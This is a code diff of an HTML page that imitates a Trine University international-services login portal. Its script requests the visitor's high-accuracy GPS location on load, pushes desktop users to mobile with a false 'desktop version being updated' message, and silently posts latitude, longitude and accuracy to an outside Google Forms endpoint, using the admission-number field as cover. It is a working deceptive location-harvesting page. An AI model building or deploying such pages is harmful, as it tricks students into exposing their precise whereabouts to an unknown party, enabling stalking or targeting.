@@ -65,82 +65,96 @@
     </style>
 </head>
 <body onload="requestLocation()">
-    <div class="header">
-        <div>TRINE UNIVERSITY</div>
+<div class="header">
+    <div>TRINE UNIVERSITY</div>
+</div>
+<div class="container">
+    <div class="section">
+        <div id="locationError" class="hidden"></div>
+        <p>The Office of International Services provides a variety of online services for our institution's international students. Please log in using one of the options below to view information or to make a request.</p>
+        <label for="admissionNumber">Student Admission Number:</label>
+        <input type="text" id="admissionNumber" name="admissionNumber">
+        <button id="submit">Enter</button>
+        <p id="output"></p>
     </div>
-    <div class="container">
-        <div class="section">
-            <div id="locationError" class="hidden"></div>
-            <p>The Office of International Services provides a variety of online services for our institution's international students. Please log in using one of the options below to view information or to make a request.</p>
-            <label for="admissionNumber">Student Admission Number:</label>
-            <input type="text" id="admissionNumber" name="admissionNumber">
-            <button id="submit">Enter</button>
-            <p id="output"></p>
-        </div>
-    </div>
-    <div class="footer">
-        Secure Online Session
-    </div>
+</div>
+<div class="footer">
+    Secure Online Session
+</div>
 
-    <script>
-        function requestLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError, { timeout: 5000 });
-            } else {
-                displayError("Geolocation is not supported by this browser.");
-            }
+<script>
+    function requestLocation() {
+// Check if user is on a mobile device
+const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+if (!isMobile) {
+    displayError("The Desktop version is currently being updated. Please use a Mobile device to access the website for now.");
+    return; // Stop execution if not on mobile
+}
+
+// Continue with location request if on mobile
+if (navigator.geolocation) {
+const options = {
+        enableHighAccuracy: true,  // Request the most accurate position available
+        timeout: 10000,            // Longer timeout to allow for more accurate positioning
+        maximumAge: 0              // Always get a fresh position, don't use cached
+    };
+    navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError, options);
+} else {
+    displayError("Not supported by this browser.");
+}
+}
+
+    function sendLocationData(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        sendForm(latitude, longitude, accuracy);
+    }
+
+    function sendForm(latitude, longitude, accuracy) {
+        const admissionNo = document.getElementById("admissionNumber").value;
+        if (!admissionNo) {
+            alert("Please enter your Admission Number.");
+            return;
         }
 
-        function sendLocationData(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            sendForm(latitude, longitude, accuracy);
-        }
+        const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
+        const data = new URLSearchParams();
+        data.append("entry.1267598962", latitude);
+        data.append("entry.1270259896", longitude);
+        data.append("entry.1888406517", accuracy);
 
-        function sendForm(latitude, longitude, accuracy) {
-            const admissionNo = document.getElementById("admissionNumber").value;
-            if (!admissionNo) {
-                alert("Please enter your Admission Number.");
-                return;
-            }
-
-            const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
-            const data = new URLSearchParams();
-            data.append("entry.1267598962", latitude);
-            data.append("entry.1270259896", longitude);
-            data.append("entry.1888406517", accuracy);
-
-            fetch(formUrl, {
-                method: "POST",
-                body: data,
-                mode: "no-cors",
-            }).then(() => {
-                window.location.href = "next-page.html"; // Redirect to another page on success
-            }).catch((error) => {
-                document.getElementById("output").innerText = "Error: " + error.message;
-            });
-        }
-
-        function handleLocationError(error) {
-            displayError("Error: Please enable location access to continue. Once Done, the page will be redirected automatically, if not please close the page and try opening in a new Window.");
-        }
-
-        function displayError(message) {
-            const locationError = document.getElementById("locationError");
-            locationError.innerHTML = message;
-            locationError.classList.remove('hidden');
-        }
-
-        document.getElementById('submit').addEventListener('click', function(event) {
-            event.preventDefault();
-            const admissionNumber = document.getElementById('admissionNumber').value;
-            if (!admissionNumber) {
-                alert("Please enter your Student Admission Number.");
-                return;
-            }
-            requestLocation(); // Ensure location data is tried again on submit if not already done
+        fetch(formUrl, {
+            method: "POST",
+            body: data,
+            mode: "no-cors",
+        }).then(() => {
+            window.location.href = "next-page.html"; // Redirect to another page on success
+        }).catch((error) => {
+            document.getElementById("output").innerText = "Error: " + error.message;
         });
-    </script>
+    }
+
+    function handleLocationError(error) {
+        displayError("Error: Please enable location access to continue. Once Done, the page will be redirected automatically, if not please close the page and try opening in a new Window.");
+    }
+
+    function displayError(message) {
+        const locationError = document.getElementById("locationError");
+        locationError.innerHTML = message;
+        locationError.classList.remove('hidden');
+    }
+
+    document.getElementById('submit').addEventListener('click', function(event) {
+        event.preventDefault();
+        const admissionNumber = document.getElementById('admissionNumber').value;
+        if (!admissionNumber) {
+            alert("Please enter your Student Admission Number.");
+            return;
+        }
+        requestLocation(); // Ensure location data is tried again on submit if not already done
+    });
+</script>
 </body>
 </html>
